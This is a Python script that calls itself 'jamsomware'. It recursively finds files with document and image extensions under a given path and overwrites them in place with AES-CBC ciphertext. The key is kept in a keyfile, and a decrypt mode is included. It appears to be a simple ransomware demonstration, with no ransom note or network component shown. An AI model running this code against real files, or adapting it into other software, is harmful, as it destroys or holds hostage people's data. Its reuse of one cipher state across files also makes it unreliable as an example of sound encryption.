#!/usr/bin/python
# coding: UTF-8

import argparse
import json
import os
import sys
from base64 import b64decode, b64encode

import logzero
from Cryptodome import Random
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from logzero import logger

EXTENSIONS = (
    ".jpg",
    ".JPG",
    ".png",
    ".PNG",
    ".txt",
    ".pdf",
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".odt",
    ".ods",
    ".odp",
)


class JamCrypt:
    block_size = 16
    keyfile = None
    key = None
    src = None
    cipher = None
    count = 0

    def __init__(self, src, keyfile):

        self.keyfile = keyfile
        self.src = src

        logger.debug(os.path.isfile(self.keyfile))
        if os.path.isfile(self.keyfile):
            self._load_keyfile()
        else:
            self._init_keyfile()

    def _init_keyfile(self, keyfile=None):
        """Initializes the keyfile"""
        logger.info("Initalizing key file at %s", self.keyfile)
        self.key = Random.get_random_bytes(32)

        self._init_cipher()

        with open(self.keyfile, "w", encoding="utf-8") as keyfile:
            keyfile.write(
                json.dumps(
                    {
                        "iv": b64encode(self.cipher.iv).decode("utf-8"),
                        "key": b64encode(self.key).decode("utf-8"),
                    }
                )
            )

    def _init_cipher(self):
        """Initializes the cipher"""
        self.cipher = AES.new(self.key, AES.MODE_CBC)

    def _load_keyfile(self):
        """Loads the keyfile"""
        logger.debug("Loading key file at %s", self.keyfile)
        with open(self.keyfile, "r", encoding="utf-8") as keyfile:
            try:
                keyfile_data = json.loads(keyfile.read())
            except json.JSONDecodeError:
                logger.error("%s is not a valid key file", self.keyfile)
                sys.exit(1)
        self.key = b64decode(keyfile_data["key"])
        self.cipher = AES.new(self.key, AES.MODE_CBC, b64decode(keyfile_data["iv"]))

    def encrypt(self, src):
        """Encrypts a file or directory"""
        logger.info("Encrypting %s", src)
        if os.path.isfile(src):
            self._encrypt_file(src)
        elif os.path.isdir(src):
            self._encrypt_dir(src)
        else:
            logger.error("%s is not a file or directory", src)

    def _encrypt_dir(self, src):
        """Encrypts a directory"""
        logger.debug("Encrypting directory %s", src)
        for file in os.listdir(src):
            logger.debug("Path found: %s", src + "/" + file)
            if file.endswith(EXTENSIONS):
                self._encrypt_file(src + "/" + file)
            elif os.path.isdir(src + "/" + file):
                self._encrypt_dir(src + "/" + file)

    def _encrypt_file(self, src):
        """Encrypts a file"""
        logger.debug("Encrypting file %s", src)
        with open(src, "rb") as infile:
            plaintext = infile.read()

        with open(src, "wb") as outfile:
            outfile.write(self.cipher.encrypt(pad(plaintext, AES.block_size)))

        self.count += 1

    def decrypt(self, src):
        """Decrypts a file or directory"""
        logger.info("Decrypting %s", src)
        if os.path.isfile(src):
            self._decrypt_file(src)
        elif os.path.isdir(src):
            self._decrypt_dir(src)
        else:
            logger.error("%s is not a file or directory", src)

    def _decrypt_dir(self, src):
        """Decrypts a directory"""
        logger.debug("Decrypting directory %s", src)
        for file in os.listdir(src):
            logger.debug("Path found: %s", src + "/" + file)
            if file.endswith(EXTENSIONS):
                self._decrypt_file(src + "/" + file)
            elif os.path.isdir(src + "/" + file):
                self._decrypt_dir(src + "/" + file)

    def _decrypt_file(self, src):
        """Decrypts a file"""
        logger.debug("Decrypting file %s", src)
        with open(src, "rb") as infile:
            plaintext = infile.read()

        with open(src, "wb") as outfile:
            try:
                outfile.write(unpad(self.cipher.decrypt(plaintext), AES.block_size))
            except ValueError:
                logger.error("%s is not a valid encrypted file", src)
                return

        self.count += 1


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--decrypt", action="store_true", default=False)
    parser.add_argument("-e", "--encrypt", action="store_true", default=False)
    parser.add_argument(
        "-k", "--key", default=os.path.join(os.path.expanduser("~"), "jam.key")
    )
    parser.add_argument("path", help="Directory/file to encrypt/decrypt")
    parser.add_argument("--verbose", "-v", action="store_true", default=False)
    args = parser.parse_args()

    if not args.verbose:
        logzero.loglevel(logzero.INFO)

    # if args.key:
    #     keyfilehandle = open(args.key, "rb")
    #     key = keyfilehandle.read(JamCrypt.key_size)

    if args.encrypt and args.decrypt:
        logger.error("Cannot encrypt and decrypt at the same time")
        sys.exit(1)

    logger.info("Starting jamsomware")
    logger.info("==================================================")
    jamcrypt = JamCrypt(args.path, args.key)

    if args.decrypt:
        logger.debug("Decrypt %s", args.decrypt)
        jamcrypt.decrypt(args.path)
    elif args.encrypt:
        logger.debug("Encrypt %s", args.encrypt)
        jamcrypt.encrypt(args.path)
    else:
        logger.error("No action specified")

    logger.info("==================================================")
    logger.info(
        "Finished %s %s files",
        jamcrypt.count,
        "encrypted" if args.encrypt else "decrypted",
    )
    logger.info("==================================================")
